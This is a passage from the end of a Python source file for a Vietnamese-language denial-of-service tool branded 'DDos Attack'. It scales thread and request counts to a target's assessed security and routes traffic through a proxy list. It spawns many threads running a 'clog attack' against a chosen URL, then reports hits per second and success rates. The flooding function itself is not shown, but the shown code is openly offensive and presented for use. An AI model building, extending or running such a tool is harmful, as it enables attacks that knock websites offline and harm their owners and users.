            console.print(f"[info]HỆ THỐNG: Đang đánh giá bảo mật... [success][⚡][/] [bold yellow]*BEEP*[/]")
            loading_animation("Đánh giá bảo mật", 2, theme_color)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url, theme_color)

            if security_level == "THẤP":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
                attack_strategy = "TẤN CÔNG NHẸ"
            elif security_level == "TRUNG BÌNH":
                attack_strategy = "LỰC LƯỢNG VỪA PHẢI"
            else:
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)
                attack_strategy = "LỰC LƯỢNG TỐI ĐA"

            panel = Panel(
                f"""
[bold {theme_color}]CHIẾN LƯỢC: [bold magenta]CLOG ATTACK[/]
[bold {theme_color}]Mục tiêu: [bold green]{validated_url}[/]
[bold {theme_color}]Luồng: [bold green]{num_threads:,}[/]
[bold {theme_color}]Yêu cầu/Luồng: [bold green]{requests_per_thread:,}[/]
[bold {theme_color}]Thời gian: [bold green]{duration}[/] giây
[bold {theme_color}]Chiến lược: [bold magenta]{attack_strategy}[/]
[bold {theme_color}]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold {theme_color}]Proxy Hoạt động: [bold green]{len(PROXY_LIST)}[/]
[bold {theme_color}]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title=f"[bold {theme_color} on magenta]THÔNG TIN TẤN CÔNG[/]",
                style=f"{theme_color} on magenta"
            )
            console.print(panel)
            confirm = Confirm.ask(f"[error]HỆ THỐNG: Xác nhận tấn công [success][?][/] [bold yellow]*BEEP*[/]")
            if not confirm:
                console.print(f"[warning]HỆ THỐNG: Hủy tấn công [warning][⚠][/] [bold yellow]*HUM*[/]")
                continue

            console.print(f"[error]HỆ THỐNG: Khởi động tấn công... [success][⚡][/] [bold yellow]*BEEP*[/]")
            loading_animation("Khởi động hệ thống", 3, theme_color)

            global success_count, error_count, response_times
            success_count = 0
            error_count = 0
            response_times = []
            start_time = time.time()

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[bold green]{task.completed}/{task.total} yêu cầu[/]"),
                console=console
            ) as progress:
                task = progress.add_task(f"[bold {theme_color}]TẤN CÔNG CLOG[/] [success][⚡][/] ©2025 Quang Bao", total=num_threads * requests_per_thread)
                threads = []
                for _ in range(num_threads):
                    t = threading.Thread(target=clog_attack, args=(validated_url, requests_per_thread, duration, progress, task, theme_color))
                    threads.append(t)
                    t.start()

                try:
                    for t in threads:
                        t.join()
                except KeyboardInterrupt:
                    console.print(f"[warning]HỆ THỐNG: Tấn công bị dừng bởi người dùng [warning][⚠][/] [bold yellow]*HUM*[/]")
                    display_exit_banner(theme_color)
                    exit(0)

            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0
            rps = (num_threads * requests_per_thread) / total_time if total_time > 0 else 0
            success_rate = (success_count / max(1, success_count + error_count)) * 100
            error_rate = (error_count / max(1, success_count + error_count)) * 100

            # Biểu đồ ASCII động cho báo cáo
            console.clear()
            console.print(f"[bold {theme_color}]BÁO CÁO CHIẾN DỊCH: [bold magenta]CLOG ATTACK[/]")
            time.sleep(0.5)
            success_bar = ""
            for i in range(int(success_rate / 5) + 1):
                success_bar = '█' * i
                console.clear()
                console.print(f"[bold {theme_color}]BÁO CÁO CHIẾN DỊCH: [bold magenta]CLOG ATTACK[/]")
                console.print(f"[bold {theme_color}]Thành công: [bold green]{success_bar} {success_rate:.1f}%[/]")
                time.sleep(0.05)
            error_bar = ""
            for i in range(int(error_rate / 5) + 1):
                error_bar = '▒' * i
                console.clear()
                console.print(f"[bold {theme_color}]BÁO CÁO CHIẾN DỊCH: [bold magenta]CLOG ATTACK[/]")
                console.print(f"[bold {theme_color}]Thành công: [bold green]{success_bar} {success_rate:.1f}%[/]")
                console.print(f"[bold {theme_color}]Thất bại: [bold red]{error_bar} {error_rate:.1f}%[/]")
                time.sleep(0.05)
            report = Panel(
                f"""
[bold {theme_color}]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold {theme_color}]Thành công: [bold green]{success_count:,} ({success_rate:.1f}%)[/] [success][✓][\\]
[bold {theme_color}]Thất bại: [bold red]{error_count:,} ({error_rate:.1f}%)[/] [error][✗][\\]
[bold {theme_color}]Tổng thời gian: [bold green]{total_time:.2f}[/] giây
[bold {theme_color}]Thời gian phản hồi trung bình: [bold green]{avg_response_time:.2f}[/]ms
[bold {theme_color}]Hiệu suất đỉnh: [bold green]{max_response_time:.2f}[/]ms
[bold {theme_color}]Độ trễ tối thiểu: [bold green]{min_response_time:.2f}[/]ms
[bold {theme_color}]Lượt đánh/giây: [bold green]{rps:.0f}[/]
[bold {theme_color}]Proxy Hoạt động: [bold green]{len(PROXY_LIST)}[/]
[bold {theme_color}]Thành công: [bold green]{success_bar} {success_rate:.1f}%[/]
[bold {theme_color}]Thất bại: [bold red]{error_bar} {error_rate:.1f}%[/]
[bold {theme_color}]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title=f"[bold {theme_color} on magenta]BÁO CÁO TẤN CÔNG[/]",
                style=f"{theme_color} on magenta"
            )
            console.clear()
            console.print(report)
            console.print(f"[success]HỆ THỐNG: Báo cáo hoàn tất! [success][✓][/] [bold yellow]*VORTEX*[/]")

        except KeyboardInterrupt:
            console.print(f"[warning]HỆ THỐNG: Tấn công bị dừng bởi người dùng [warning][⚠][/] [bold yellow]*HUM*[/]")
            display_exit_banner(theme_color)
            exit(0)
        except Exception as e:
            console.print(f"[error]HỆ THỐNG: Lỗi nghiêm trọng: [bold red]{str(e)}[/] [error][✗][/] [bold yellow]*ALERT*[/]")
            exit(1)

if __name__ == "__main__":
    main()